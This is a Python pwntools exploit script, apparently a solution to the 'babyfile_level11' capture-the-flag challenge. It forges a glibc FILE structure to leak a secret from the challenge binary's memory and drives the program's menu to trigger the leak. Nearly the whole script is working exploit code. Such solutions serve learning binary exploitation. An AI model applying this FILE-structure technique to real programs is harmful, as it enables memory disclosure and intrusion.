#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder

_libc = "./libc.so.6"
_ld = "./ld-linux-x86-64.so.2"

HOST = 'localhost'
port = 1337
_arch = 64

user = os.getenv('USER')
if user == 'broder':
    binary = "./babyfile_level11_patched"
else:
    binary = "/challenge/babyfile_level11"
    
context.log_level = 'debug'
context.binary = elf = ELF(binary, checksec=False)

if user == 'broder':
    libc = ELF(_libc, checksec=False)
    _ld = ELF(_ld, checksec=False)
else:
    libc = elf.libc



environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
b *main
b *challenge+299
c
decompiler connect ida --host 172.19.176.1 --port 3662
b *fwrite
b *_IO_wfile_overflow
b *_IO_wdoallocbuf
b *authenticate+37
b *authenticate+79
c
c
p fp
p *(struct _IO_FILE_plus *)$2
p (*(struct _IO_FILE_plus *)$2)->file->_wide_data
p *$4
"""

info        = lambda msg: log.info(msg)
success     = lambda msg: log.success(msg)
error       = lambda msg: log.error(msg)
sla         = lambda msg, data: io.sendlineafter(msg, data)
sa          = lambda msg, data: io.sendafter(msg, data)
sl          = lambda data: io.sendline(data)
s           = lambda data: io.send(data)
rcu         = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def stop():
    if args.GDB:
        pause()

def start():
    if args.GDB:
        if args.VSCODE:
            context.terminal = ["/home/broder/.vscode-terminal"]
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, port)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

secret = elf.sym['secret']

io = start()

sla(b'> ', b'open_file')
rcu(b'fp = fopen("/tmp/babyfile.txt", "w") = ')
fp = int(io.recvline().strip(), 16)
success(f"fp @ {hex(fp)}")
fs = FileStructure()
payload = fs.write(secret, 50)

sla(b'> ', b'new_note')
sla(b'How many bytes to the note?\n> ', str(len(payload)).encode())
rcu(b'notes[0] = ')
note = int(rcu(b';')[:-1], 16)
success(f"note @ {hex(note)}")

sla(b'> ', b'write_fp')
rcu(b':0:0:0}')
s(payload)

sla(b'> ', b'write_file')
io.interactive()
